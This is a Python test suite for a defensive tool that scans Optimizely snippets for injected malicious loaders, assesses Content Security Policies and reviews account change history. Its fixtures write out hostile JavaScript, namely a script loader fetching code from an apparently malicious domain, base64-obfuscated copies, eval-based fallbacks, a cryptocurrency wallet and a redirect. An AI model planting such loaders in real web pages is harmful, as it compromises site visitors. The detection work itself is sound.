"""Offline tests for optimizely_check.py. Run from the repository root:  python3 -m unittest -v

Optional extras, each skipped unless its environment variable is set:
  OPT_SPEC=<swagger.json>   every REST path, parameter and field the api mode uses exists in Optimizely's spec
                            (download it from https://api.optimizely.com/v2/swagger.json)
  OPT_SNIPPETS=<directory>  no HIGH finding on real, clean snippets saved in that directory (*.js)
"""
import base64
import contextlib
import glob
import gzip
import hashlib
import http.server
import io
import json
import os
import sys
import tempfile
import threading
import unittest
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import optimizely_check as O  # noqa: E402

UUIDS = ["9BA72258-96D7-4D07-A3BF-2E9AED840888", "92624D4C-96DC-4480-9E69-403AFF54609D",
         "1602DD62-D897-4F97-AC20-8660199215ED", "7BC26365-4D87-4BAC-8B9C-86590D4C996E"]

# Optimizely's own library is minified with no space after the colon, so these must never be scanned.
CORE = ('!function(){var t={changeType:{CUSTOM_CODE:"custom_code"},"x":function(e){return eval(e)},'
        '"y":function(){var s=document.createElement("script");s.src="https://evil.example/a.js"}};'
        'window.optimizely=window.optimizely||[]}();')

# The loader Report URI published from Zoom's snippet (16 November 2026).
PLAIN_LOADER = ("(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';"
                "s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();")


def b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def make_snippet(project_js="window.dataLayer = window.dataLayer || [];", changes=(), actions=(),
                 account="111", project="222", revision="7") -> str:
    data = f'{{"accountId": "{account}", "projectId": "{project}", "revision": "{revision}"'
    if project_js is not None:
        data += ', "projectJS": function(){' + project_js + '}'
    items = [f'{{"id": "{UUIDS[i]}", "type": "custom_code", "value": function($){{{code}}}, "dependencies": []}}'
             for i, code in enumerate(changes)]
    items += [f'{{"id": "{UUIDS[-1]}", "src": "/actions/{a}.js", "dependencies": [], "type": "custom_code"}}'
              for a in actions]
    data += ', "layers": [{"id": "1", "variations": [{"id": "2", "actions": [{"viewId": "3", "changes": ['
    data += ", ".join(items) + "]}]}]}]}"
    return CORE + "window.optimizely.push({type: \"load\", data: " + data + "});"


def levels(findings):
    return [f.level for f in findings]


def fake_fetch(table):
    """A stand-in for http_get that serves bytes from a dict and records what was asked."""
    calls = []

    def fetch(url, headers=None, timeout=30.0):
        calls.append((url, headers or {}))
        if url not in table:
            return O.Fetched(url, 404, {}, b"not found")
        body, hdrs = table[url] if isinstance(table[url], tuple) else (table[url], {})
        return O.Fetched(url, 200, {k.lower(): [v] for k, v in hdrs.items()}, body)
    fetch.calls = calls
    return fetch


def scan_text(text, **kw):
    with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as fh:
        fh.write(text)
    try:
        return O.scan_snippet(fh.name, **kw)
    finally:
        os.unlink(fh.name)


class BraceMatcher(unittest.TestCase):
    def body(self, js):
        start = js.index("{")
        end = O.match_brace(js, start)
        return js[start + 1:end - 1] if end else None

    def test_strings_comments_and_templates_do_not_count(self):
        js = "{ var a = '{'; var b = \"}\"; // }\n /* { */ var c = `x ${ {k: 1}.k } }`; }TAIL"
        self.assertTrue(self.body(js).endswith("}`; "))

    def test_regex_literals_with_braces(self):
        js = "{ var r = /[{}]+/g; if (r.test(x)) { return /}/.test(y); } }TAIL"
        self.assertEqual(O.match_brace(js, 0), len(js) - 4)

    def test_division_is_not_a_regex(self):
        js = "{ var a = b / c / d; var e = { f: 1 }; }TAIL"
        self.assertEqual(O.match_brace(js, 0), len(js) - 4)

    def test_unbalanced_returns_none(self):
        self.assertIsNone(O.match_brace("{ { }", 0))


class SnippetParsing(unittest.TestCase):
    def test_metadata_blocks_and_actions(self):
        sha = "ab" * 32
        snip = O.parse_snippet(make_snippet(changes=["$('h1').text('Hi');"], actions=[sha]))
        self.assertEqual((snip.account_id, snip.project_id, snip.revision), ("111", "222", "7"))
        self.assertEqual([b.key for b in snip.blocks], ["projectJS", "value"])
        self.assertEqual(snip.blocks[1].change_id, UUIDS[0])
        self.assertEqual(snip.actions, [f"/actions/{sha}.js"])

    def test_library_code_is_ignored(self):
        findings, _ = scan_text(make_snippet())
        self.assertEqual([f for f in findings if f.level != O.INFO], [])

    def test_no_data_object_falls_back_to_indicators(self):
        findings, _ = scan_text("console.log('https://1688360.cc/track.js')")
        self.assertIn(O.HIGH, levels(findings))
        self.assertTrue(any("no Optimizely data object" in f.message for f in findings))


class LoaderVariants(unittest.TestCase):
    def test_plain_loader(self):
        findings, _ = scan_text(make_snippet(project_js="window.a = 1;\n" + PLAIN_LOADER))
        highs = [f for f in findings if f.level == O.HIGH]
        self.assertTrue(any("1688360[.]cc" in f.message for f in highs))
        self.assertTrue(all("Project JavaScript" in f.where for f in highs))
        self.assertEqual(O.exit_code(findings), 1)

    def test_base64_loader_is_found_though_text_search_misses_it(self):
        js = ("(function(){var s=document.createElement('script');s.src=atob('" + b64("https://1688360.cc/track.js")
              + "');document.head.appendChild(s);})();")
        self.assertNotIn("1688360", js)
        findings, _ = scan_text(make_snippet(project_js=js))
        self.assertTrue(any(f.level == O.HIGH and "base64 hides" in f.message for f in findings))

    def test_base64_loader_on_a_fresh_domain(self):
        js = "var u=atob('" + b64("https://cdn-metrics-cache.example/t.js") + "');"
        findings, _ = scan_text(make_snippet(project_js=js))
        self.assertTrue(any(f.level == O.HIGH and "cdn-metrics-cache[.]example" in f.message for f in findings))

    def test_inline_fallback_with_eval_and_wallets(self):
        js = ("var W={btc:'19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW'};try{eval(document.getElementById('x').text)}"
              "catch(e){}")
        findings, _ = scan_text(make_snippet(changes=[js]))
        self.assertIn(O.HIGH, levels(findings))
        self.assertTrue(any(f.level == O.MEDIUM and "eval()" in f.message for f in findings))
        self.assertTrue(any(UUIDS[0] in f.where for f in findings))

    def test_unknown_script_host_is_for_review_until_allowed(self):
        js = "var s=document.createElement('script');s.src='https://cdn.vendor-analytics.example/tag.js';"
        findings, _ = scan_text(make_snippet(project_js=js))
        self.assertEqual(levels([f for f in findings if f.level != O.INFO]), [O.MEDIUM])
        self.assertEqual(O.exit_code(findings), 2)
        findings, _ = scan_text(make_snippet(project_js=js), allowed_hosts=["vendor-analytics.example"])
        self.assertEqual([f for f in findings if f.level != O.INFO], [])

    def test_known_payload_hash(self):
        text = "x"
        digest = hashlib.sha256(text.encode()).hexdigest()
        O.IOC_HASHES[digest] = "test payload"
        try:
            findings, _ = scan_text(text)
        finally:
            del O.IOC_HASHES[digest]
        self.assertTrue(any("payload itself" in f.message for f in findings))

    def test_output_is_defanged(self):
        findings, _ = scan_text(make_snippet(project_js=PLAIN_LOADER))
        self.assertFalse(any("1688360.cc" in f.message for f in findings))


class UrlsActionsAndBaseline(unittest.TestCase):
    URL = "https://cdn.optimizely.com/js/222.js"

    def test_headers_are_reported_and_actions_verified(self):
        good = b'window.optimizely.push({type:"load",data:{changes:[]}});'
        bad = b'window.optimizely.push({type:"load"});' + PLAIN_LOADER.encode()
        good_sha, bad_name = hashlib.sha256(good).hexdigest(), "cd" * 32
        base = "https://cdn.optimizely.com/public/111/data/actions/"
        fetch = fake_fetch({
            self.URL: (make_snippet(actions=[good_sha, bad_name]).encode(),
                       {"Last-Modified": "Mon, 16 Nov 2026 21:29:18 GMT", "x-amz-meta-revision": "7"}),
            f"{base}{good_sha}.js": good, f"{base}{bad_name}.js": bad})
        findings, summary = O.scan_snippet(self.URL, fetch_actions=True, fetch=fetch)
        self.assertEqual(summary["last-modified"], "Mon, 16 Nov 2026 21:29:18 GMT")
        self.assertEqual(summary["x-amz-meta-revision"], "7")
        self.assertTrue(any("does not match the SHA-256" in f.message and bad_name in f.where for f in findings))
        self.assertTrue(any("1688360[.]cc" in f.message and bad_name in f.where for f in findings))
        self.assertFalse(any(good_sha in f.where and f.level == O.HIGH for f in findings))

    def test_http_error_is_raised(self):
        with self.assertRaises(O.FetchError):
            O.scan_snippet(self.URL, fetch=fake_fetch({}))

    def test_baseline_reports_a_new_loader(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "baseline.json")
            clean = fake_fetch({self.URL: make_snippet().encode()})
            first, _ = O.scan_snippet(self.URL, baseline=path, fetch=clean)
            self.assertTrue(any("baseline saved" in f.message for f in first))
            js = "var s=document.createElement('script');s.src='https://cdn-metrics-cache.example/t.js';"
            changed = fake_fetch({self.URL: make_snippet(project_js=js, revision="8").encode()})
            second, _ = O.scan_snippet(self.URL, baseline=path, fetch=changed)
            messages = [f.message for f in second]
            self.assertTrue(any("revision 7 -> 8" in m for m in messages))
            self.assertTrue(any(m.startswith("Project JavaScript changed") for m in messages))
            self.assertTrue(any("new external host" in m and "cdn-metrics-cache[.]example" in m for m in messages))
            third, _ = O.scan_snippet(self.URL, baseline=path, fetch=clean)
            self.assertTrue(any("unchanged since the baseline" in f.message for f in third))


class RealHttp(unittest.TestCase):
    def test_gzip_body_and_repeated_headers(self):
        payload = make_snippet().encode()

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                body = gzip.compress(payload)
                self.send_response(200)
                self.send_header("Content-Encoding", "gzip")
                self.send_header("Content-Security-Policy", "script-src 'self'")
                self.send_header("Content-Security-Policy", "connect-src 'self'")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass

        server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            got = O.http_get(f"http://127.0.0.1:{server.server_port}/js/222.js")
        finally:
            server.shutdown()
            server.server_close()
        self.assertEqual(got.body, payload)
        self.assertEqual(len(got.headers["content-security-policy"]), 2)


# Optimizely's documented CSP (docs.optimizely.com, "Update your site's Content Security Policies", 8 Nov 2026).
OPTIMIZELY_DOC_POLICY = (
    "default-src 'none'; frame-src https://a123.cdn.optimizely.com https://a123.cdn-pci.optimizely.com; "
    "script-src 'self' https://*.optimizely.com https://optimizely.s3.amazonaws.com "
    "https://cdn-assets-prod.s3.amazonaws.com 'nonce-r4nd0m' 'strict-dynamic' 'unsafe-eval'; "
    "connect-src https://logx.optimizely.com https://*.optimizely.com wss://*.optimizely.com; "
    "img-src https://cdn.optimizely.com; style-src https://*.optimizely.com 'unsafe-inline'; "
    "font-src 'self' https://*.optimizely.com")
PAGE = "https://shop.example.com/checkout"


def verdict(*policies, page=PAGE):
    return O.assess_csp([O.parse_policy(p) for p in policies], page)


class Csp(unittest.TestCase):
    def test_no_policy(self):
        self.assertEqual(verdict()[0], O.VERDICT_NONE)

    def test_report_only_blocks_nothing(self):
        fetched = O.Fetched(PAGE, 200, {"content-security-policy-report-only": ["default-src 'self'"]}, b"")
        enforced, report_only = O.collect_policies(fetched, [], None)
        self.assertEqual((len(enforced), len(report_only)), (0, 1))
        self.assertEqual(O.assess_csp(enforced, PAGE)[0], O.VERDICT_NONE)

    def test_optimizely_documented_policy_lets_the_payload_run(self):
        v, steps, flags = verdict(OPTIMIZELY_DOC_POLICY)
        self.assertEqual(v, O.VERDICT_PARTIAL)
        self.assertTrue(steps["load"].allowed and "'strict-dynamic'" in steps["load"].why)
        self.assertTrue(steps["fallback"].allowed)
        self.assertFalse(steps["exfil"].allowed)
        self.assertFalse(steps["ios_frame"].allowed)
        self.assertEqual(len([f for f in flags if "strict-dynamic" in f or "unsafe-eval" in f]), 2)

    def test_optimizely_short_policy_allows_everything(self):
        self.assertEqual(verdict("script-src 'nonce-r4nd0m' 'strict-dynamic'")[0], O.VERDICT_ALLOWED)

    def test_host_allowlist_without_eval_blocks(self):
        policy = "script-src 'self' https://cdn.optimizely.com; connect-src 'self' https://logx.optimizely.com"
        self.assertEqual(verdict(policy)[0], O.VERDICT_BLOCKED)

    def test_unsafe_eval_lets_the_inline_copy_run(self):
        policy = ("script-src 'self' https://cdn.optimizely.com 'unsafe-eval'; "
                  "connect-src 'self' https://logx.optimizely.com")
        v, steps, _ = verdict(policy)
        self.assertEqual(v, O.VERDICT_PARTIAL)
        self.assertFalse(steps["load"].allowed)

    def test_scheme_and_star_sources(self):
        self.assertEqual(verdict("script-src https:; connect-src https:")[0], O.VERDICT_ALLOWED)
        self.assertEqual(verdict("default-src *")[0], O.VERDICT_ALLOWED)

    def test_default_src_is_the_fallback(self):
        v, steps, _ = verdict("default-src 'self' https://*.optimizely.com")
        self.assertEqual(v, O.VERDICT_BLOCKED)
        self.assertIn("default-src", steps["exfil"].why)

    def test_every_enforced_policy_must_allow(self):
        self.assertEqual(verdict("default-src *", "script-src 'self'; connect-src 'self'")[0], O.VERDICT_BLOCKED)

    def test_unsafe_inline_is_ignored_next_to_a_nonce(self):
        policy = "script-src 'self' 'nonce-abc' 'unsafe-inline'; connect-src 'self'"
        self.assertEqual(verdict(policy)[0], O.VERDICT_BLOCKED)
        self.assertEqual(verdict("script-src 'self' 'unsafe-inline'; connect-src 'self'")[0], O.VERDICT_PARTIAL)

    def test_script_src_elem_takes_precedence(self):
        policy = "script-src https:; script-src-elem 'self'; connect-src 'self'"
        self.assertFalse(verdict(policy)[1]["load"].allowed)

    def test_host_source_matching(self):
        m = O.source_matches
        self.assertTrue(m("https://*.optimizely.com", "https://cdn.optimizely.com/js/1.js", PAGE))
        self.assertFalse(m("https://*.optimizely.com", "https://optimizely.com/js/1.js", PAGE))
        self.assertFalse(m("https://*.optimizely.com", "https://1688360.cc/track.js", PAGE))
        self.assertTrue(m("cdn.optimizely.com", "https://cdn.optimizely.com/js/1.js", PAGE))
        self.assertFalse(m("cdn.optimizely.com:8443", "https://cdn.optimizely.com/js/1.js", PAGE))
        self.assertTrue(m("https://cdn.optimizely.com/js/", "https://cdn.optimizely.com/js/1.js", PAGE))
        self.assertFalse(m("https://cdn.optimizely.com/public/", "https://cdn.optimizely.com/js/1.js", PAGE))
        self.assertTrue(m("'self'", "https://shop.example.com/a.js", PAGE))
        self.assertFalse(m("'self'", "https://1688360.cc/track.js", PAGE))

    def test_meta_policy_in_html(self):
        page = ('<html><head><meta http-equiv="Content-Security-Policy" '
                'content="script-src \'self\'; connect-src \'self\'"></head></html>')
        enforced, _ = O.collect_policies(None, [], page)
        self.assertEqual(O.assess_csp(enforced, PAGE)[0], O.VERDICT_BLOCKED)

    def test_comma_separated_header_is_two_policies(self):
        fetched = O.Fetched(PAGE, 200, {"content-security-policy": ["default-src *, script-src 'self'"]}, b"")
        enforced, _ = O.collect_policies(fetched, [], None)
        self.assertEqual(len(enforced), 2)


class StandIn(http.server.BaseHTTPRequestHandler):
    """Answers like api.optimizely.com/v2 with the response shapes in its published swagger.json."""
    projects = [{"id": 10, "name": "Main site", "platform": "web", "status": "active",
                 "web_snippet": {"code_revision": 41, "js_file_size": 90958,
                                 "project_javascript": "window.dataLayer = window.dataLayer || [];\n" + PLAIN_LOADER}},
                {"id": 11, "name": "Old app", "platform": "custom", "status": "active"}]
    seen: list = []

    def do_GET(self):
        url = urllib.parse.urlsplit(self.path)
        q = urllib.parse.parse_qs(url.query)
        StandIn.seen.append((url.path, q, self.headers.get("Authorization")))
        page, path = int(q.get("page", ["1"])[0]), url.path.removeprefix("/v2")
        if path == "/projects":
            body = self.projects if page == 1 else []
        elif path == "/projects/10":
            body = self.projects[0]
        elif path == "/experiments":
            exps = [{"id": i, "name": f"Test {i}", "changes": [], "variations": []} for i in range(100)]
            exps.append({"id": 900, "name": "Hero banner", "changes": [
                {"id": "S1", "type": "custom_code", "value": "var x = atob('" + b64("https://1688360.cc/track.js")
                 + "');"}],
                "variations": [{"variation_id": 5, "actions": [{"page_id": 1, "changes": [
                    {"id": "C1", "type": "custom_code", "value": "$('h1').text('Hello');"},
                    {"id": "C2", "type": "redirect", "destination_function": "return 'https://1688360.cc/';"},
                    {"id": "C3", "type": "custom_code", "async": True, "src": "/actions/" + "ab" * 32 + ".js"}]}]}]})
            body = exps[(page - 1) * 100:page * 100]
        elif path == "/campaigns":
            body = [{"id": 70, "changes": [{"id": "K1", "type": "custom_code", "value": "eval(window.name);"}]}]
        elif path == "/pages":
            body = [{"id": 1, "activation_code": "function(activate){activate();}"}] if page == 1 else []
        elif path == "/extensions":
            body = [{"id": 3, "implementation": {"apply_js": "var s=document.createElement('script');"
                                                             "s.src='https://cdn.vendor.example/w.js';"}}]
        elif path == "/changes":
            body = [{"id": 1, "project_id": 10, "created": "2026-11-16T04:19:02Z", "source": "api",
                     "change_type": "update", "summary": "Updated Project JavaScript",
                     "user": {"email": "new.signup@example.net"}, "entity": {"type": "project", "name": "Main site"},
                     "changes": [{"property": "project_javascript", "description": "Project JavaScript changed"}]},
                    {"id": 2, "project_id": 10, "created": "2026-11-16T09:00:00Z", "source": "ui",
                     "change_type": "publish", "summary": "Published experiment",
                     "user": {"email": "marketing@example.com"}, "entity": {"type": "experiment", "name": "Hero"},
                     "changes": []}]
        else:
            self.send_response(404)
            self.end_headers()
            return
        data = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *a):
        pass


class ApiMode(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = http.server.HTTPServer(("127.0.0.1", 0), StandIn)
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        cls.base = f"http://127.0.0.1:{cls.server.server_port}/v2"

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def run_cli(self, *argv):
        env = {"OPTIMIZELY_TOKEN": "test-token", "OPTIMIZELY_API_BASE": self.base}
        old = {k: os.environ.get(k) for k in env}
        os.environ.update(env)
        out = io.StringIO()
        try:
            with contextlib.redirect_stdout(out):
                code = O.main(list(argv))
        finally:
            for k, v in old.items():
                os.environ.pop(k, None) if v is None else os.environ.__setitem__(k, v)
        return code, out.getvalue()

    def test_review_of_all_web_projects(self):
        StandIn.seen.clear()
        code, out = self.run_cli("api")
        self.assertEqual(code, 1)
        self.assertIn("Project 10 (Main site)", out)
        self.assertNotIn("Project 11", out)                       # not a web project
        self.assertIn("Project JavaScript", out)
        self.assertIn("experiment 900 (Hero banner) shared code", out)
        self.assertIn("base64 hides", out)
        self.assertIn("change C2 (redirect)", out)
        self.assertIn("campaign 70 shared code", out)
        self.assertIn("extension 3 apply_js", out)
        self.assertIn("code changed 2026-11-16T04:19:02Z by new.signup@example.net via api", out)
        self.assertNotIn("1688360.cc", out)
        exp_pages = sorted(int(q["page"][0]) for p, q, _ in StandIn.seen if p == "/v2/experiments")
        self.assertEqual(exp_pages, [1, 2])
        self.assertTrue(all(auth == "Bearer test-token" for _, _, auth in StandIn.seen))
        changes = [q for p, q, _ in StandIn.seen if p == "/v2/changes"][0]
        self.assertEqual((changes["start_time"], changes["end_time"]),
                         (["2026-11-16T00:00:00Z"], ["2026-11-17T06:00:00Z"]))

    def test_single_project_json(self):
        code, out = self.run_cli("api", "--project", "10", "--json", "--allow-host", "vendor.example")
        report = json.loads(out)
        self.assertEqual(report[0]["project"], 10)
        self.assertEqual(len(report[0]["history"]), 2)
        self.assertFalse(any("vendor[.]example" in f["message"] for f in report[0]["findings"]))

    def test_missing_token(self):
        old = os.environ.pop("OPTIMIZELY_TOKEN", None)
        try:
            with contextlib.redirect_stderr(io.StringIO()):
                self.assertEqual(O.main(["api"]), 3)
        finally:
            if old is not None:
                os.environ["OPTIMIZELY_TOKEN"] = old


class Cli(unittest.TestCase):
    def test_snippet_exit_codes(self):
        with tempfile.TemporaryDirectory() as tmp:
            clean, bad = os.path.join(tmp, "clean.js"), os.path.join(tmp, "bad.js")
            open(clean, "w").write(make_snippet())
            open(bad, "w").write(make_snippet(project_js=PLAIN_LOADER))
            with contextlib.redirect_stdout(io.StringIO()) as out:
                self.assertEqual(O.main(["snippet", clean]), 0)
                self.assertEqual(O.main(["snippet", bad]), 1)
            self.assertIn("nothing found in this snippet", out.getvalue())

    def test_csp_exit_codes(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(O.main(["csp", "--policy", OPTIMIZELY_DOC_POLICY]), 2)
            self.assertEqual(O.main(["csp", "--policy", "default-src 'self'"]), 0)
            self.assertEqual(O.main(["csp", "--policy", "script-src 'nonce-a' 'strict-dynamic'"]), 1)


@unittest.skipUnless(os.environ.get("OPT_SPEC"), "set OPT_SPEC to Optimizely's swagger.json")
class AgainstPublishedSpec(unittest.TestCase):
    """Every path, query parameter and response field the api mode relies on exists in the published spec."""

    def test_paths_parameters_and_fields(self):
        with open(os.environ["OPT_SPEC"], encoding="utf-8") as fh:
            spec = json.load(fh)
        paths, defs, shared = spec["paths"], spec["definitions"], spec.get("parameters", {})

        def resolve(p):
            return shared[p["$ref"].rsplit("/", 1)[1]] if "$ref" in p else p
        used = {"/projects": {"per_page", "page"}, "/projects/{project_id}": {"project_id"},
                "/experiments": {"per_page", "page", "project_id"}, "/campaigns": {"per_page", "page", "project_id"},
                "/pages": {"per_page", "page", "project_id"}, "/extensions": {"per_page", "page", "project_id"},
                "/changes": {"per_page", "page", "project_id", "start_time", "end_time"}}
        for path, params in used.items():
            self.assertIn("get", paths[path], path)
            names = {resolve(p).get("name") for p in paths[path]["get"].get("parameters", [])}
            self.assertLessEqual(params, names, path)
        fields = {"Project": {"id", "name", "platform", "status", "web_snippet"},
                  "WebSnippet": {"project_javascript", "code_revision", "js_file_size"},
                  "Experiment": {"id", "name", "changes", "variations"}, "Variation": {"variation_id", "actions"},
                  "Action": {"changes"}, "Change": {"id", "type", "value", "destination_function", "async", "src"},
                  "SharedCodeChange": {"id", "type", "value", "async", "src"}, "Campaign": {"id", "changes"},
                  "Page": {"id", "activation_code"}, "Extension": {"id", "implementation"},
                  "Implementation": {"apply_js", "reset_js", "html"},
                  "ChangeHistoryChange": {"created", "source", "summary", "user", "entity", "change_type", "changes"},
                  "User": {"email", "display_name"}, "Entity": {"type", "name"},
                  "ChangeDetail": {"property", "description"}}
        for name, wanted in fields.items():
            self.assertLessEqual(wanted, set(defs[name]["properties"]), name)
        self.assertIn("web", defs["Project"]["properties"]["platform"]["enum"])
        self.assertIn("redirect", defs["Change"]["properties"]["type"]["enum"])


@unittest.skipUnless(os.environ.get("OPT_SNIPPETS"), "set OPT_SNIPPETS to a folder of real snippets")
class RealSnippets(unittest.TestCase):
    def test_clean_snippets_raise_no_high(self):
        files = sorted(glob.glob(os.path.join(os.environ["OPT_SNIPPETS"], "*.js")))
        self.assertTrue(files)
        for path in files:
            findings, summary = O.scan_snippet(path)
            self.assertNotIn(O.HIGH, levels(findings), path)
            with open(path, encoding="utf-8", errors="replace") as fh:
                if '{"accountId"' in fh.read():           # a snippet, not an external action file
                    self.assertTrue(summary["code_blocks"], path)


if __name__ == "__main__":
    unittest.main()
